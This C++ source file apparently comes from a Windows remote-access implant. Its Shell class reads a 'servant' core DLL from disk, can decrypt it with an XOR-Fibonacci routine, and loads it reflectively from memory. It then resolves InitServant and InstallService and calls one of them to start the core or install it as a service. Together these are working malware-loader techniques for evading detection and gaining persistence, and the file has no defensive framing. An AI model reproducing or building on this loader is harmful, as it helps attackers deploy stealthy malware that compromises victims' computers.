#include "stdafx.h"
#include <wininet.h>
#include <atlenc.h>
#include "file/MyFile.h"
#include "Exports.h"
#include "MessageDefines.h"
#include "BinNames.h"
#include "common.h"
#include "Shell.h"

#pragma comment(lib, "wininet.lib")

Shell::Shell()
	: m_bWorking(FALSE)
	, m_pServant(NULL)
	, m_fnInitServant(NULL)
	, m_fnDeinitServant(NULL)
{

}

Shell::~Shell()
{

}

BOOL Shell::Init()
{
	m_dllpath = GetBinFilepath();
	m_dllpath += SERVANT_CORE_BINNAME;     //TEXT("body.dll")
	return TRUE;
}

void Shell::Deinit()
{
	Stop();
	if (NULL != m_fnDeinitServant) m_fnDeinitServant();
}

void Shell::Stop()
{
}

BOOL Shell::DecodeBase64(LPCSTR base64Encoded, DWORD dwBase64Length, ByteBuffer& byteBuffer) const
{
	int iDecLen = Base64DecodeGetRequiredLength(dwBase64Length) + 10;
	BYTE* pBuffer = (BYTE*) malloc(iDecLen);
	ZeroMemory(pBuffer, iDecLen);

	BOOL bRet = Base64Decode(base64Encoded, dwBase64Length, pBuffer, &iDecLen);
	if (bRet)
	{
		byteBuffer.Alloc(iDecLen);
		memcpy((LPBYTE)byteBuffer, pBuffer, iDecLen);
	}
	else
	{
		errorLogE(_T("base64decode failed."));
	}

	free(pBuffer);

	return bRet;	
}

BOOL Shell::LoadServant( BOOL isIns)
{
#ifdef DEBUG

#define GETPROCADDRESSD(_lib,fnType,fnName) \
	(fnType)GetProcAddress(_lib,fnName);		//获取 DLL 导出函数的地址

	tstring strPath = GetBinFilepath();
	strPath += SERVANT_CORE_BINNAME;

	HANDLE hLib = LoadLibrary(strPath.c_str());			//加载dll
	m_fnInitServant = GETPROCADDRESSD((HMODULE)hLib,FnInitServant,"InitServant");
	m_fnDeinitServant = GETPROCADDRESSD((HMODULE)hLib,FnDeinitServant, "DeinitServant");
	m_fnInstallService = GETPROCADDRESSD((HMODULE)hLib,FnInstallService, "InstallService");

	if (isIns)
	{
		infoLog(_T("kang  m_fnInstallService"));
		//(FnInstallService)GetProcAddress((HMODULE)hLib, "InstallService");
		m_fnInstallService();
		infoLog(_T("kang  m_fnInstallService1"));
	}
	else
	{
		infoLog(_T("kang  m_fnInitServant"));
		m_fnInitServant();
		infoLog(_T("kang  m_fnInitServant1"));
	}
	return TRUE;

#endif


	if (NULL != m_pServant)
	{
		delete m_pServant;
		m_pServant = NULL;
	}
	infoLog(_T("Test OK"));
	MyFile file;
	if (! file.Open(m_dllpath.c_str(), GENERIC_READ, OPEN_EXISTING, FILE_SHARE_READ))
	{
		errorLogE(_T("open file [%s] failed"), m_dllpath.c_str());
		return FALSE;
	}
	ByteBuffer content;
	if (! file.ReadAll(content))
	{
		errorLogE(_T("read file [%s] failed"), m_dllpath.c_str());
		return FALSE;
	}


#ifdef USE_ENCRYPTED_CORE
	debugLog(_T("decrypt dll file"));
	XorFibonacciCrypt((LPBYTE)content, content.Size(), (LPBYTE)content, 3, 5);
#endif

	m_pServant = new CMemLoadDll;
	BOOL bSuccess = FALSE;
	do 
	{
		debugLog(_T("shell.cpp LoadServant() load memlibrary"));
		if (! m_pServant->MemLoadLibrary((LPBYTE)content, content.Size()))
		{
			errorLogE(_T("load memlibrary failed [%s]"), m_dllpath.c_str());
			break;
		}

#define GETPROCADDRESS(_var, _type, _name)							\
	(_var) = (_type) m_pServant->MemGetProcAddress(_name);			\
	if (NULL == (_var))												\
	{																\
		errorLog(_T("get address of p[%s] failed"), a2t(_name));	\
		break;														\
	}
		
		GETPROCADDRESS(m_fnInitServant,    FnInitServant,    "InitServant");
		GETPROCADDRESS(m_fnDeinitServant,  FnDeinitServant,  "DeinitServant");
		GETPROCADDRESS(m_fnInstallService, FnInstallService, "InstallService");

		if ( isIns )
		{
			infoLog(_T("kang1  m_Install Service"));
			m_fnInstallService();
			infoLog(_T("kang1  m_Install Service1"));
		}
		else
		{
			infoLog(_T("kang1  m_Init Servant"));
			m_fnInitServant();
			infoLog(_T("kang1  m_Init Servant1"));
		}
		bSuccess = TRUE;
		debugLog(_T("load servantcore success"));
	} while (FALSE);

 	if (! bSuccess)
 	{
 		delete m_pServant;
 		m_pServant = NULL;
 		m_fnInitServant = NULL;
 		m_fnDeinitServant = NULL;
		errorLog(_T("load servant failed"));
 	}
	return bSuccess;
}